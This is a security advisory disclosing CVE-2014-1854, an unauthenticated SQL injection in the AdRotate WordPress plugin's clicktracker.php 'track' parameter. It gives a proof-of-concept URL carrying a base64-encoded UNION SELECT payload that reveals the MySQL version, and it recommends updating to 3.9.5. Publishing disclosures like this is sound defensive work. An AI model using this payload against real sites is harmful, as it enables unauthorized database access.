Advisory Details:

High-Tech Bridge Security Research Lab discovered vulnerability in AdRotate, which can be exploited to perform SQL Injection attacks.


1) SQL Injection in AdRotate: CVE-2014-1854

The vulnerability exists due to insufficient validation of "track" HTTP GET parameter passed to
 "/wp-content/plugins/adrotate/library/clicktracker.php" script. A remote unauthenticated attacker can execute arbitrary SQL commands in application's database.

The following PoC code contains a base64-encoded string "-1 UNION SELECT version(),1,1,1", which will be injected into SQL query and will output MySQL server version:

http://[host]/wp-content/plugins/adrotate/library/clicktracker.php?track=LTEgVU5JT04gU0VMRUNUIHZlcnNpb24oKSwxLDEsMQ==

Successful exploitation will result in redirection to local URI that contains version of the MySQL server:
http://[host]/wp-content/plugins/adrotate/library/5.1.71-community-log


-----------------------------------------------------------------------------------------------

Solution:

Update to AdRotate 3.9.5
